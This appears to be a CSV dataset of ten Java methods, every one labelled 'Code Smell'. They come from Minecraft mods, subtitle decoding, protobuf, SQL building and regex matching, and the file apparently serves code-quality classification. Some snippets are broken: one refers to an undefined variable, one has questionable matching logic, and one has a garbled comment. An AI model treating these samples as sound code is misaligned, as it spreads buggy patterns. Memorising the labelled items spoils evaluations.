text,label,text_label
"private int findHotbarSlot(HighwayBuilder b,boolean replaceTools){
  int thrashSlot=-1;
  int slotsWithBlocks=0;
  int slotWithLeastBlocks=-1;
  int slotWithLeastBlocksCount=Integer.MAX_VALUE;
  for (int i=0; i < 9; i++) {
    ItemStack itemStack=b.mc.player.getInventory().getStack(i);
    if (itemStack.isEmpty())     return i;
    if (replaceTools && AutoTool.isTool(itemStack))     return i;
    if (b.trashItems.get().contains(itemStack.getItem()))     thrashSlot=i;
    if (itemStack.getItem() instanceof BlockItem && b.blocksToPlace.get().contains(blockItem.getBlock())) {
      slotsWithBlocks++;
      if (itemStack.getCount() < slotWithLeastBlocksCount) {
        slotWithLeastBlocksCount=itemStack.getCount();
        slotWithLeastBlocks=i;
      }
    }
  }
  if (thrashSlot != -1)   return thrashSlot;
  if (slotsWithBlocks > 1)   return slotWithLeastBlocks;
  b.error(""No empty space in hotbar."");
  return -1;
}",1,Code Smell
"@Override protected SubripSubtitle decode(byte[] bytes,int length,boolean reset){
  ArrayList<Cue> cues=new ArrayList<>();
  LongArray cueTimesUs=new LongArray();
  ParsableByteArray subripData=new ParsableByteArray(bytes,length);
  String currentLine;
  while ((currentLine=subripData.readLine()) != null) {
    if (currentLine.length() == 0) {
      continue;
    }
    try {
      Integer.parseInt(currentLine);
    }
 catch (    NumberFormatException e) {
      Log.w(TAG,""Skipping invalid index: "" + currentLine);
      continue;
    }
    boolean haveEndTimecode=false;
    currentLine=subripData.readLine();
    if (currentLine == null) {
      Log.w(TAG,""Unexpected end"");
      break;
    }
    Matcher matcher=SUBRIP_TIMING_LINE.matcher(currentLine);
    if (matcher.matches()) {
      cueTimesUs.add(parseTimecode(matcher,1));
      if (!TextUtils.isEmpty(matcher.group(6))) {
        haveEndTimecode=true;
        cueTimesUs.add(parseTimecode(matcher,6));
      }
    }
 else {
      Log.w(TAG,""Skipping invalid timing: "" + currentLine);
      continue;
    }
    textBuilder.setLength(0);
    tags.clear();
    currentLine=subripData.readLine();
    while (!TextUtils.isEmpty(currentLine)) {
      if (textBuilder.length() > 0) {
        textBuilder.append(""<br>"");
      }
      textBuilder.append(processLine(currentLine,tags));
      currentLine=subripData.readLine();
    }
    Spanned text=Html.fromHtml(textBuilder.toString());
    String alignmentTag=null;
    for (int i=0; i < tags.size(); i++) {
      String tag=tags.get(i);
      if (tag.matches(SUBRIP_ALIGNMENT_TAG)) {
        alignmentTag=tag;
        break;
      }
    }
    cues.add(buildCue(text,alignmentTag));
    if (haveEndTimecode) {
      cues.add(Cue.EMPTY);
    }
  }
  Cue[] cuesArray=new Cue[cues.size()];
  cues.toArray(cuesArray);
  long[] cueTimesUsArray=cueTimesUs.toArray();
  return new SubripSubtitle(cuesArray,cueTimesUsArray);
}",1,Code Smell
"@Override public boolean saveGroup(Group group){
  isTrue(!root.readonly(),IS_READ_ONLY);
  isTrue(storages.containsKey(group.getType()),NOT_SUPPORTED_GROUP_TYPE);
  notNull(group.getName(),NAME_REQUIRED);
  notNull(IoUtils.validateFileName(group.getName()),NAME_INVALID);
  notNull(group.getParentId(),GROUP_ID_REQUIRED);
  MagicResourceStorage<? extends MagicEntity> storage=storages.get(group.getType());
  return writeLock(() -> {
    Resource resource;
    if (Constants.ROOT_ID.equals(group.getParentId())) {
      resource=root.getDirectory(group.getType());
    }
 else {
      resource=getGroupResource(group.getParentId());
      isTrue(resource != null && resource.exists(),GROUP_NOT_FOUND);
    }
    Resource groupResource;
    GroupEvent event=new GroupEvent(group.getType(),group.getId() == null ? EventAction.CREATE : EventAction.SAVE,group);
    if (group.getId() == null || !groupCache.containsKey(group.getId())) {
      if (group.getId() == null) {
        group.setId(UUID.randomUUID().toString().replace(""-"",""""));
      }
      group.setCreateTime(System.currentTimeMillis());
      group.setCreateBy(WebUtils.currentUserName());
      groupResource=resource.getDirectory(group.getName());
      isTrue(!groupResource.exists(),FILE_SAVE_FAILURE);
      groupResource.mkdir();
    }
 else {
      Group oldGroup=groupCache.get(group.getId());
      if (storage.requirePath() && !Objects.equals(oldGroup.getPath(),group.getPath())) {
        TreeNode<Group> treeNode=tree(group.getType());
        String oldPath=oldGroup.getPath();
        oldGroup.setPath(group.getPath());
        List<MagicEntity> entities=treeNode.findTreeNode(it -> it.getId().equals(group.getId())).flat().stream().flatMap(it -> fileCache.values().stream().filter(f -> f.getGroupId().equals(it.getId()))).collect(Collectors.toList());
        for (        MagicEntity entity : entities) {
          String newMappingKey=storage.buildKey(entity);
          if (pathCache.get(group.getType()).entrySet().stream().anyMatch(entry -> entry.getValue().equals(newMappingKey) && !entry.getKey().equals(entity.getId()))) {
            oldGroup.setPath(oldPath);
            throw new InvalidArgumentException(SAVE_GROUP_PATH_CONFLICT);
          }
        }
      }
      Resource oldResource=getGroupResource(group.getId());
      groupResource=resource.getDirectory(group.getName());
      isTrue(oldResource != null && oldResource.exists(),GROUP_NOT_FOUND);
      group.setUpdateBy(WebUtils.currentUserName());
      group.setUpdateTime(System.currentTimeMillis());
      if (!Objects.equals(oldGroup.getName(),group.getName())) {
        isTrue(!groupResource.exists(),FILE_SAVE_FAILURE);
        isTrue(oldResource.renameTo(groupResource),FILE_SAVE_FAILURE);
      }
    }
    if (groupResource.getResource(Constants.GROUP_METABASE).write(JsonUtils.toJsonString(group))) {
      putGroup(group,groupResource);
      TreeNode<Group> treeNode=tree(group.getType()).findTreeNode(it -> it.getId().equals(group.getId()));
      refreshGroup(groupResource,storage);
      if (event.getAction() != EventAction.CREATE) {
        event.setEntities(treeNode.flat().stream().flatMap(g -> listFiles(g.getId()).stream()).collect(Collectors.toList()));
      }
      publisher.publishEvent(event);
      return true;
    }
    return false;
  }
);
}
",1,Code Smell
"@java.lang.Override public int getSerializedSize(){
  int size=memoizedSize;
  if (size != -1)   return size;
  size=0;
  if (metadata_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(1,getMetadata());
  }
{
    int dataSize=0;
    for (int i=0; i < forwardFeatureMapping_.size(); i++) {
      dataSize+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(forwardFeatureMapping_.getInt(i));
    }
    size+=dataSize;
    if (!getForwardFeatureMappingList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    forwardFeatureMappingMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    for (int i=0; i < backwardFeatureMapping_.size(); i++) {
      dataSize+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(backwardFeatureMapping_.getInt(i));
    }
    size+=dataSize;
    if (!getBackwardFeatureMappingList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    backwardFeatureMappingMemoizedSerializedSize=dataSize;
  }
  if (!com.google.protobuf.GeneratedMessageV3.isStringEmpty(modelDirectory_)) {
    size+=com.google.protobuf.GeneratedMessageV3.computeStringSize(4,modelDirectory_);
  }
  if (featureConverter_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(5,getFeatureConverter());
  }
  if (outputConverter_ != null) {
    size+=com.google.protobuf.CodedOutputStream.computeMessageSize(6,getOutputConverter());
  }
  if (!com.google.protobuf.GeneratedMessageV3.isStringEmpty(outputName_)) {
    size+=com.google.protobuf.GeneratedMessageV3.computeStringSize(7,outputName_);
  }
  size+=unknownFields.getSerializedSize();
  memoizedSize=size;
  return size;
}",1,Code Smell
"Expression resolveCallExpressionInternal(Type targetType,String name,List<? extends ExpressionElement> inner,boolean implicit){
  int innerLength=inner.size();
  Expression result=null;
  TypedFunction resultFunction=null;
  functions:   for (  TypedFunction f : this.functionResolver.resolve(name,targetType)) {
    Parameter[] paramTypes=f.getParameters();
    if (paramTypes.length != innerLength)     continue;
    Expression[] params=new Expression[innerLength];
    for (int i=0; i < innerLength; i++) {
      ExpressionElement paramExpression=inner.get(i);
      Parameter param=paramTypes[i];
      if (param.constant() && !(paramExpression instanceof NumberToken)) {
        continue functions;
      }
      Expression expression=this.resolveExpressionInternal(param.type(),paramExpression,!implicit || innerLength > 1,implicit);
      if (expression == null)       continue functions;
      params[i]=expression;
    }
    if (result != null && f.priority() == resultFunction.priority()) {
      throw new RuntimeException(""Ambiguity, \n\told: "" + TypedFunction.format(resultFunction,"""") + ""\n\tnew: ""+ TypedFunction.format(f,""""));
    }
 else     if (resultFunction == null || f.priority() >= resultFunction.priority()) {
      result=new CallExpression(f,params);
      resultFunction=f;
    }
  }
  return result;
}",1,Code Smell
"@Override public String buildDeleteSql(QueryWrapper queryWrapper){
  List<QueryTable> queryTables=CPI.getQueryTables(queryWrapper);
  List<QueryTable> joinTables=CPI.getJoinTables(queryWrapper);
  List<QueryTable> allTables=CollectionUtil.merge(queryTables,joinTables);
  StringBuilder sqlBuilder=new StringBuilder(DELETE);
  String hint=CPI.getHint(queryWrapper);
  if (StringUtil.isNotBlank(hint)) {
    sqlBuilder.append(BLANK).append(hint).deleteCharAt(sqlBuilder.length() - 1);
  }
  if (joinTables != null && !joinTables.isEmpty()) {
    if (queryTables == null || queryTables.isEmpty()) {
      throw new IllegalArgumentException(""Delete with join sql must designate the from table."");
    }
 else     if (queryTables.size() != 1) {
      throw new IllegalArgumentException(""Delete with join sql must has 1 table only. but current has "" + queryTables.size());
    }
    QueryTable queryTable=queryTables.get(0);
    String table=getRealTable(queryTable.getName(),OperateType.DELETE);
    if (StringUtil.isNotBlank(queryTable.getSchema())) {
      sqlBuilder.append(wrap(getRealSchema(queryTable.getSchema(),table,OperateType.DELETE))).append(REFERENCE);
    }
    sqlBuilder.append(BLANK).append(wrap(getRealTable(table,OperateType.DELETE)));
  }
  sqlBuilder.append(FROM).append(StringUtil.join(DELIMITER,queryTables,queryTable -> queryTable.toSql(this,OperateType.DELETE)));
  buildJoinSql(sqlBuilder,queryWrapper,allTables,OperateType.DELETE);
  buildWhereSql(sqlBuilder,queryWrapper,allTables,false);
  buildGroupBySql(sqlBuilder,queryWrapper,allTables);
  buildHavingSql(sqlBuilder,queryWrapper,allTables);
  buildOrderBySql(sqlBuilder,queryWrapper,allTables);
  Long limitRows=CPI.getLimitRows(queryWrapper);
  Long limitOffset=CPI.getLimitOffset(queryWrapper);
  if (limitRows != null || limitOffset != null) {
    sqlBuilder=buildLimitOffsetSql(sqlBuilder,queryWrapper,limitRows,limitOffset);
  }
  List<String> endFragments=CPI.getEndFragments(queryWrapper);
  if (CollectionUtil.isNotEmpty(endFragments)) {
    for (    String endFragment : endFragments) {
      sqlBuilder.append(BLANK).append(endFragment);
    }
  }
  return sqlBuilder.toString();
}",1,Code Smell
"@Override public void onPermissionGranted(String[] permissions){
  boolean show=false;
  for (  String permission : permissions) {
    if (permission.equals(Manifest.permission.READ_EXTERNAL_STORAGE) || (Build.VERSION.SDK_INT >= 33 && permission.equals(Manifest.permission.READ_MEDIA_VIDEO))) {
      show=true;
      break;
    }
  }
  if (!show)   return;
  if (_enableOptions) {
    show=false;
    for (    String permission : permissions) {
      if (permission.equals(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
        show=true;
        break;
      }
    }
  }
  if (!show)   return;
  if (_adapter.isEmpty())   refreshDirs();
  showDialog();
}",1,Code Smell
"public static TabbyVariable parsePosition(String position,TabbyVariable baseVar,Map<Integer,TabbyVariable> args,boolean created){
  if (position == null)   return null;
  TabbyVariable retVar=null;
  String[] positions=position.split(""\\|"");
  for (  String pos : positions) {
    if (pos.contains(""&remain"")) {
      pos=pos.split(""&"")[0];
    }
    if (""this"".equals(pos)) {
      retVar=baseVar;
    }
 else     if (pos.startsWith(""param-"")) {
      int index=Integer.valueOf(pos.split(""-"")[1]);
      retVar=args.get(index);
    }
 else     if (retVar != null && StringUtils.isNumeric(pos)) {
      int index=Integer.valueOf(pos);
      TabbyVariable tempVar=retVar.getElement(index);
      if (created && tempVar == null) {
        tempVar=TabbyVariable.makeRandomInstance();
        boolean isPolluted=retVar.isPolluted();
        tempVar.getValue().setPolluted(isPolluted);
        if (isPolluted) {
          tempVar.getValue().setRelatedType(retVar.getValue().getRelatedType() + ""|"" + index);
        }
        retVar.addElement(index,tempVar);
      }
      retVar=tempVar;
    }
 else     if (retVar != null) {
      TabbyVariable tempVar=retVar.getField(pos);
      if (created && tempVar == null) {
        SootField field=retVar.getSootField(pos);
        if (field != null) {
          tempVar=retVar.getOrAddField(retVar,field);
        }
      }
      retVar=tempVar;
    }
 else {
      retVar=null;
    }
  }
  return retVar;
}",1,Code Smell
"/** 
 * add or modify flow control rule
 * @param req       Http Servlet Request
 * @param sBuffer   string buffer
 * @param result    process result
 * @return    process result
 */
private StringBuilder innAddOrUpdGroupFlowCtrlRule(HttpServletRequest req,StringBuilder sBuffer,ProcessResult result,boolean isAddOp){
  if (!WebParameterUtils.getAUDBaseInfo(req,isAddOp,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  BaseEntity opEntity=(BaseEntity)result.getRetData();
  if (!WebParameterUtils.getStringParamValue(req,WebFieldDef.COMPSGROUPNAME,true,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  final Set<String> groupNameSet=(Set<String>)result.getRetData();
  if (!WebParameterUtils.getQryPriorityIdParameter(req,false,TBaseConstants.META_VALUE_UNDEFINED,TServerConstants.QRY_PRIORITY_MIN_VALUE,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  int qryPriorityId=(int)result.getRetData();
  if (!WebParameterUtils.getFlowCtrlStatusParamValue(req,false,null,sBuffer,result)) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  EnableStatus flowCtrlEnable=(EnableStatus)result.getRetData();
  int flowRuleCnt=WebParameterUtils.getAndCheckFlowRules(req,(isAddOp ? TServerConstants.BLANK_FLOWCTRL_RULES : null),sBuffer,result);
  if (!result.isSuccess()) {
    WebParameterUtils.buildFailResult(sBuffer,result.getErrMsg());
    return sBuffer;
  }
  String flowCtrlInfo=(String)result.getRetData();
  GroupResCtrlEntity ctrlEntity;
  List<GroupProcessResult> retInfoList=new ArrayList<>();
  for (  String groupName : groupNameSet) {
    ctrlEntity=defMetaDataService.getGroupCtrlConf(groupName);
    if (ctrlEntity == null) {
      if (isAddOp) {
        retInfoList.add(defMetaDataService.insertGroupCtrlConf(opEntity,groupName,qryPriorityId,flowCtrlEnable,flowRuleCnt,flowCtrlInfo,sBuffer,result));
      }
 else {
        result.setFailResult(DataOpErrCode.DERR_NOT_EXIST.getCode(),DataOpErrCode.DERR_NOT_EXIST.getDescription());
        retInfoList.add(new GroupProcessResult(groupName,"""",result));
      }
    }
 else {
      retInfoList.add(defMetaDataService.insertGroupCtrlConf(opEntity,groupName,qryPriorityId,flowCtrlEnable,flowRuleCnt,flowCtrlInfo,sBuffer,result));
    }
  }
  return buildRetInfo(retInfoList,sBuffer);
}
",1,Code Smell
"/** 
 * DP鏂规硶鍖归厤
 * @param s
 * @param p
 * @return
 */
public boolean isMatch2(String s,String p){
  int n=s.length() + 1, m=p.length() + 1;
  boolean[][] dp=new boolean[m][n];
  dp[0][0]=true;
  if (m > 2) {
    for (int i=1; i < m - 1; i+=2) {
      if (p.charAt(i) == '*') {
        dp[i][0]=dp[i - 1][0];
        dp[i + 1][0]=dp[i][0];
      }
    }
  }
  for (int i=1; i < m; i++) {
    for (int j=1; j < n; j++) {
      char pat=p.charAt(i - 1);
      dp[i][j]=dp[i - 1][j - 1] && (s.charAt(j - 1) == pat || pat == '.');
      if (pat == '*' && i >= 2) {
        if (dp[i][j - 1] || dp[i - 1][j - 1]) {
          dp[i][j]=dp[i - 2][j] || (s.charAt(j - 1) == p.charAt(i - 2) || p.charAt(i - 2) == '.');
        }
 else {
          dp[i][j]=dp[i - 2][j];
        }
      }
    }
  }
  return dp[m - 1][n - 1];
}",1,Code Smell
